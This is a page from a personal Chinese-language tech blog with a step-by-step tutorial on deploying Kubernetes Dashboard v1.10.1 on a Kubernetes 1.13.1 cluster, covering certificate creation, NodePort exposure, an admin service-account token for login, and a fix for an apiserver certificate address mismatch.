<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"minminmsn.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="MinMinMsn">
<meta property="og:url" content="https://minminmsn.github.io/page/21/index.html">
<meta property="og:site_name" content="MinMinMsn">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Jerry Min">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://minminmsn.github.io/page/21/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>MinMinMsn</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">MinMinMsn</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/30/2018/12/2018-12-30-kubernetes1-13-1%E9%83%A8%E7%BD%B2kuberneted-dashboard-v1-10-1/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/30/2018/12/2018-12-30-kubernetes1-13-1%E9%83%A8%E7%BD%B2kuberneted-dashboard-v1-10-1/index/" class="post-title-link" itemprop="url">Kubernetes1.13.1部署Kuberneted-dashboard v1.10.1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-30 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-30T08:00:00+08:00">2018-12-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:30" itemprop="dateModified" datetime="2023-05-26T15:06:30+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a><strong>参考文档</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/#deploying-the-dashboard-ui</span><br><span class="line">https://github.com/kubernetes/kubernetes/tree/7f23a743e8c23ac6489340bbb34fa6f1d392db9d/cluster/addons/dashboard</span><br><span class="line">https://github.com/kubernetes/dashboard</span><br><span class="line">https://blog.csdn.net/nklinsirui/article/details/80581286</span><br><span class="line">https://github.com/kubernetes/dashboard/issues/3472</span><br></pre></td></tr></table></figure>

<h3 id="文档目录"><a href="#文档目录" class="headerlink" title="文档目录"></a><strong>文档目录</strong></h3><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/kubernetes/kubernetes1.13.1%2Betcd3.3.10%2Bflanneld0.10%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2.md">kubernetes1.13.1+etcd3.3.10+flanneld0.10集群部署</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/kubernetes-dashboard-amd64/Kubernetes1.13.1%E9%83%A8%E7%BD%B2Kuberneted-dashboard%20v1.10.1.md">kubernetes1.13.1部署kuberneted-dashboard v1.10.1</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/coredns/kubernetes1.13.1%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2coredns.md">kubernetes1.13.1部署coredns</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/ingress-nginx/kubernetes1.13.1%E9%83%A8%E7%BD%B2ingress-nginx%E5%B9%B6%E9%85%8D%E7%BD%AEhttps%E8%BD%AC%E5%8F%91dashboard.md">kubernetes1.13.1部署ingress-nginx并配置https转发dashboard</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/metrics-server/kubernetes1.13.1%E9%83%A8%E7%BD%B2metrics-server0.3.1.md">kubernetes1.13.1部署metrics-server0.3.1</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/volumes/rbd/k8s%E9%9B%86%E7%BE%A4%E4%BD%BF%E7%94%A8ceph%20rbd%E5%9D%97%E5%AD%98%E5%82%A8.md">kubernetes1.13.1集群使用ceph rbd存储块</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/blob/master/jenkins/k8s1.13.1%E9%9B%86%E7%BE%A4%E7%BB%93%E5%90%88ceph%20rbd%E9%83%A8%E7%BD%B2%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%ACjenkins.md">kubernetes1.13.1集群结合ceph rbd部署最新版本jenkins</a></li>
</ul>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h3><p><strong>Web UI (Dashboard)</strong> Dashboard is a web-based Kubernetes user interface. You can use Dashboard to deploy containerized applications to a Kubernetes cluster, troubleshoot your containerized application, and manage the cluster resources. You can use Dashboard to get an overview of applications running on your cluster, as well as for creating or modifying individual Kubernetes resources (such as Deployments, Jobs, DaemonSets, etc). For example, you can scale a Deployment, initiate a rolling update, restart a pod or deploy new applications using a deploy wizard. Dashboard also provides information on the state of Kubernetes resources in your cluster and on any errors that may have occurred.</p>
<h3 id="一、填坑"><a href="#一、填坑" class="headerlink" title="一、填坑"></a><strong>一、填坑</strong></h3><p>按照官网文档一条命令即可，但是国内显然不是这样，首先要填许多坑才行</p>
<h4 id="坑一：Docker镜像"><a href="#坑一：Docker镜像" class="headerlink" title="坑一：Docker镜像"></a>坑一：Docker镜像</h4><h5 id="1、注册阿里云账户构建自己的镜像"><a href="#1、注册阿里云账户构建自己的镜像" class="headerlink" title="1、注册阿里云账户构建自己的镜像"></a>1、注册阿里云账户构建自己的镜像</h5><p>可以关联github构建，这样就可以把国外镜像生成为阿里云镜像 <a target="_blank" rel="noopener" href="https://github.com/minminmsn/k8s1.13/tree/master/kubernetes-dashboard-amd64/Dockerfile">https://github.com/minminmsn/k8s1.13/tree/master/kubernetes-dashboard-amd64/Dockerfile</a></p>
<h5 id="2、下载docker镜像"><a href="#2、下载docker镜像" class="headerlink" title="2、下载docker镜像"></a>2、下载docker镜像</h5><p>docker pull registry.cn-beijing.aliyuncs.com&#x2F;minminmsn&#x2F;kubernetes-dashboard:v1.10.1</p>
<h4 id="坑二：SSL证书"><a href="#坑二：SSL证书" class="headerlink" title="坑二：SSL证书"></a>坑二：SSL证书</h4><p>证书不对或者用auto创建的证书会报错，报错见<a target="_blank" rel="noopener" href="https://github.com/kubernetes/dashboard/issues/3472">https://github.com/kubernetes/dashboard/issues/3472</a></p>
<h5 id="1、如果购买有的证书的话，把证书文件放在certs-x2F-目录下创建secret即可"><a href="#1、如果购买有的证书的话，把证书文件放在certs-x2F-目录下创建secret即可" class="headerlink" title="1、如果购买有的证书的话，把证书文件放在certs&#x2F;目录下创建secret即可"></a>1、如果购买有的证书的话，把证书文件放在certs&#x2F;目录下创建secret即可</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 /]# ls certs/</span><br><span class="line">minminmsn.crt  minminmsn.csr  minminmsn.key</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 /]# kubectl create secret generic kubernetes-dashboard-certs --from-file=certs -n kube-system</span><br><span class="line">secret/kubernetes-dashboard-certs created</span><br></pre></td></tr></table></figure>

<h5 id="2、如果没有购买的话需要自定义生成证书，步骤如下"><a href="#2、如果没有购买的话需要自定义生成证书，步骤如下" class="headerlink" title="2、如果没有购买的话需要自定义生成证书，步骤如下"></a>2、如果没有购买的话需要自定义生成证书，步骤如下</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 /]# mkdir /certs</span><br><span class="line">[root@elasticsearch01 /]# openssl req -nodes -newkey rsa:2048 -keyout certs/dashboard.key -out certs/dashboard.csr -subj &quot;/C=/ST=/L=/O=/OU=/CN=kubernetes-dashboard&quot;</span><br><span class="line">Generating a 2048 bit RSA private key</span><br><span class="line">................+++</span><br><span class="line">..............................................+++</span><br><span class="line">writing new private key to &#x27;certs/dashboard.key&#x27;</span><br><span class="line">-----</span><br><span class="line">No value provided for Subject Attribute C, skipped</span><br><span class="line">No value provided for Subject Attribute ST, skipped</span><br><span class="line">No value provided for Subject Attribute L, skipped</span><br><span class="line">No value provided for Subject Attribute O, skipped</span><br><span class="line">No value provided for Subject Attribute OU, skipped</span><br><span class="line">[root@elasticsearch01 /]# ls /certs</span><br><span class="line">dashboard.csr  dashboard.key</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 /]# openssl x509 -req -sha256 -days 365 -in certs/dashboard.csr -signkey certs/dashboard.key -out certs/dashboard.crt</span><br><span class="line">Signature ok</span><br><span class="line">subject=/CN=kubernetes-dashboard</span><br><span class="line">Getting Private key</span><br><span class="line">[root@elasticsearch01 /]# ls certs/</span><br><span class="line">dashboard.crt  dashboard.csr  dashboard.key</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 /]# kubectl create secret generic kubernetes-dashboard-certs --from-file=certs -n kube-system</span><br><span class="line">secret/kubernetes-dashboard-certs created</span><br></pre></td></tr></table></figure>

<h4 id="坑三：修改service配置，将type-ClusterIP改成NodePort-便于通过Node端口访问"><a href="#坑三：修改service配置，将type-ClusterIP改成NodePort-便于通过Node端口访问" class="headerlink" title="坑三：修改service配置，将type: ClusterIP改成NodePort,便于通过Node端口访问"></a>坑三：修改service配置，将type: ClusterIP改成NodePort,便于通过Node端口访问</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 /]# wget https://raw.githubusercontent.com/kubernetes/dashboard/master/aio/deploy/recommended/kubernetes-dashboard.yaml</span><br><span class="line">[root@elasticsearch01 /]# vim /k8s/yaml/kubernetes-dashboard.yaml </span><br><span class="line">kind: Service</span><br><span class="line">apiVersion: v1</span><br><span class="line">metadata:</span><br><span class="line">  labels:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line">  name: kubernetes-dashboard</span><br><span class="line">  namespace: kube-system</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort</span><br><span class="line">  ports:</span><br><span class="line">    - port: 443</span><br><span class="line">      targetPort: 8443</span><br><span class="line">  selector:</span><br><span class="line">    k8s-app: kubernetes-dashboard</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="二、部署Kubernetes-dashboard"><a href="#二、部署Kubernetes-dashboard" class="headerlink" title="二、部署Kubernetes-dashboard"></a><strong>二、部署Kubernetes-dashboard</strong></h3><p>修改镜像地址为registry.cn-beijing.aliyuncs.com&#x2F;minminmsn&#x2F;kubernetes-dashboard:v1.10.1即可部署</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 /]# vim /k8s/yaml/kubernetes-dashboard.yaml </span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubernetes-dashboard</span><br><span class="line">        image: registry.cn-beijing.aliyuncs.com/minminmsn/kubernetes-dashboard:v1.10.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 /]# kubectl create -f /k8s/yaml/kubernetes-dashboard.yaml </span><br><span class="line">serviceaccount/kubernetes-dashboard created</span><br><span class="line">role.rbac.authorization.k8s.io/kubernetes-dashboard-minimal created</span><br><span class="line">rolebinding.rbac.authorization.k8s.io/kubernetes-dashboard-minimal created</span><br><span class="line">deployment.apps/kubernetes-dashboard created</span><br><span class="line">service/kubernetes-dashboard created</span><br><span class="line">Error from server (AlreadyExists): error when creating &quot;/k8s/yaml/kubernetes-dashboard.yaml&quot;: secrets &quot;kubernetes-dashboard-certs&quot; already exists</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 /]# kubectl get pods -n kube-system</span><br><span class="line">NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubernetes-dashboard-cb55bd5bd-4jsh7   1/1     Running   0          21s</span><br><span class="line">[root@elasticsearch01 /]# kubectl get svc -n kube-system</span><br><span class="line">NAME                   TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)         AGE</span><br><span class="line">kubernetes-dashboard   NodePort   10.254.140.115   &lt;none&gt;        443:41579/TCP   31s</span><br><span class="line">[root@elasticsearch01 /]# kubectl get pods -n kube-system -o wide</span><br><span class="line">NAME                                   READY   STATUS    RESTARTS   AGE   IP            NODE        NOMINATED NODE   READINESS GATES</span><br><span class="line">kubernetes-dashboard-cb55bd5bd-4jsh7   1/1     Running   0          40s   10.254.73.2   10.2.8.34   &lt;none&gt;           &lt;none&gt;</span><br></pre></td></tr></table></figure>

<h3 id="三、访问dashboard"><a href="#三、访问dashboard" class="headerlink" title="三、访问dashboard"></a><strong>三、访问dashboard</strong></h3><h5 id="1、注意有证书需要域名访问，如果有DNS可以配置域名解析，没有Host绑定即可"><a href="#1、注意有证书需要域名访问，如果有DNS可以配置域名解析，没有Host绑定即可" class="headerlink" title="1、注意有证书需要域名访问，如果有DNS可以配置域名解析，没有Host绑定即可"></a>1、注意有证书需要域名访问，如果有DNS可以配置域名解析，没有Host绑定即可</h5><h5 id="2、选择token访问，token获取方法如下"><a href="#2、选择token访问，token获取方法如下" class="headerlink" title="2、选择token访问，token获取方法如下"></a>2、选择token访问，token获取方法如下</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ~]# cat /k8s/yaml/admin-token.yaml </span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1beta1</span><br><span class="line">metadata:</span><br><span class="line">  name: admin</span><br><span class="line">  annotations:</span><br><span class="line">    rbac.authorization.kubernetes.io/autoupdate: &quot;true&quot;</span><br><span class="line">roleRef:</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin</span><br><span class="line">  namespace: kube-system</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin</span><br><span class="line">  namespace: kube-system</span><br><span class="line">  labels:</span><br><span class="line">    kubernetes.io/cluster-service: &quot;true&quot;</span><br><span class="line">    addonmanager.kubernetes.io/mode: Reconcile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 yaml]# kubectl create -f admin-token.yaml </span><br><span class="line">clusterrolebinding.rbac.authorization.k8s.io/admin created</span><br><span class="line">serviceaccount/admin created</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 yaml]#  kubectl describe secret/$(kubectl get secret -nkube-system |grep admin|awk &#x27;&#123;print $1&#125;&#x27;) -nkube-system</span><br><span class="line">Name:         admin-token-5j2vf</span><br><span class="line">Namespace:    kube-system</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: admin</span><br><span class="line">              kubernetes.io/service-account.uid: 6b0b0c00-0b45-11e9-85fe-52540089b2b6</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1359 bytes</span><br><span class="line">namespace:  11 bytes</span><br><span class="line">token:</span><br><span class="line">获取tocken值</span><br></pre></td></tr></table></figure>

<p>3、效果如下 <a target="_blank" rel="noopener" href="https://k8s.minminmsn.com/">https://k8s.minminmsn.com</a> 输入token访问 上面获取的tocken值</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2019/01/02/5c2c7ce87af87.png"><img src="/images/5c2c7ce87af87.png"></a></p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a><strong>补充</strong></h3><blockquote>
<p>Apiserver hosts绑定ip错误10.0.0.1应该是10.254.0.1，默认pods网端是10.254.0.0&#x2F;16，其中10.254.0.1会用来kubenetes的clusterip [root@elasticsearch01 ~]# kubectl get svc –all-namespaces&#x3D;true NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE default kubernetes ClusterIP 10.254.0.1 443&#x2F;TCP 6d1h</p>
</blockquote>
<p>解决方法 ×××文件重启apiserver服务即可（配置前多检查，否则后面会增加很多排错过程）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 yaml]# kubectl logs kubernetes-dashboard-865b64d96f-g5f9t --namespace=kube-system</span><br><span class="line">2018/12/29 07:49:44 Starting overwatch</span><br><span class="line">2018/12/29 07:49:44 Using in-cluster config to connect to apiserver</span><br><span class="line">2018/12/29 07:49:44 Using service account token for csrf signing</span><br><span class="line">2018/12/29 07:49:44 Error while initializing connection to Kubernetes apiserver. This most likely means that the cluster is misconfigured (e.g., it has invalid apiserver certificates or service account&#x27;s configuration) or the --apiserver-host param points to a server that does not exist. Reason: Get https://10.254.0.1:443/version: x509: certificate is valid for 10.0.0.1, 127.0.0.1, 10.2.8.44, 10.2.8.65, 10.2.8.34, not 10.254.0.1</span><br><span class="line">Refer to our FAQ and wiki pages for more information: https://github.com/kubernetes/dashboard/wiki/FAQ</span><br></pre></td></tr></table></figure>

<p>修改Hosts里10.0.0.1为10.254.0.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# cat server-csr.json </span><br><span class="line">&#123;</span><br><span class="line">    &quot;CN&quot;: &quot;kubernetes&quot;,</span><br><span class="line">    &quot;hosts&quot;: [</span><br><span class="line">      &quot;10.254.0.1&quot;,</span><br><span class="line">      &quot;127.0.0.1&quot;,</span><br><span class="line">      &quot;10.2.8.44&quot;,</span><br><span class="line">      &quot;10.2.8.65&quot;,</span><br><span class="line">      &quot;10.2.8.34&quot;,</span><br><span class="line">      &quot;kubernetes&quot;,</span><br><span class="line">      &quot;kubernetes.default&quot;,</span><br><span class="line">      &quot;kubernetes.default.svc&quot;,</span><br><span class="line">      &quot;kubernetes.default.svc.cluster&quot;,</span><br><span class="line">      &quot;kubernetes.default.svc.cluster.local&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;key&quot;: &#123;</span><br><span class="line">        &quot;algo&quot;: &quot;rsa&quot;,</span><br><span class="line">        &quot;size&quot;: 2048</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;names&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;C&quot;: &quot;CN&quot;,</span><br><span class="line">            &quot;L&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;ST&quot;: &quot;Beijing&quot;,</span><br><span class="line">            &quot;O&quot;: &quot;k8s&quot;,</span><br><span class="line">            &quot;OU&quot;: &quot;System&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同步证书并重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@elasticsearch01 ssl]# cfssl gencert -ca=ca.pem -ca-key=ca-key.pem -config=ca-config.json -profile=kubernetes server-csr.json | cfssljson -bare server</span><br><span class="line">2018/12/29 15:57:02 [INFO] generate received request</span><br><span class="line">2018/12/29 15:57:02 [INFO] received CSR</span><br><span class="line">2018/12/29 15:57:02 [INFO] generating key: rsa-2048</span><br><span class="line">2018/12/29 15:57:03 [INFO] encoded CSR</span><br><span class="line">2018/12/29 15:57:03 [INFO] signed certificate with serial number 57756035754570455349189088480535470836534926573</span><br><span class="line">2018/12/29 15:57:03 [WARNING] This certificate lacks a &quot;hosts&quot; field. This makes it unsuitable for</span><br><span class="line">websites. For more information see the Baseline Requirements for the Issuance and Management</span><br><span class="line">of Publicly-Trusted Certificates, v.1.1.6, from the CA/Browser Forum (https://cabforum.org);</span><br><span class="line">specifically, section 10.2.3 (&quot;Information Requirements&quot;).</span><br><span class="line"></span><br><span class="line">[root@elasticsearch01 ssl]# scp server-csr.json server.csr server-key.pem server.pem 10.2.8.65:$PWD</span><br><span class="line">[root@elasticsearch01 ssl]# scp server-csr.json server.csr server-key.pem server.pem 10.2.8.34:$PWD</span><br><span class="line">[root@elasticsearch01 ssl]# systemctl restart kube-apiserver</span><br><span class="line">[root@elasticsearch01 ssl]# systemctl restart kube-scheduler</span><br><span class="line">[root@elasticsearch01 ssl]# systemctl restart kube-controller-manager</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2018/12/27/2018/12/2018-12-27-kubernetes13-1etcd3-3-10flannel0-10%E9%83%A8%E7%BD%B2/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2018/12/27/2018/12/2018-12-27-kubernetes13-1etcd3-3-10flannel0-10%E9%83%A8%E7%BD%B2/index/" class="post-title-link" itemprop="url">kubernetes13.1+etcd3.3.10+flanneld0.10部署</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-12-27 08:00:00" itemprop="dateCreated datePublished" datetime="2018-12-27T08:00:00+08:00">2018-12-27</time>
            </span>
              <span class="post-meta-item">
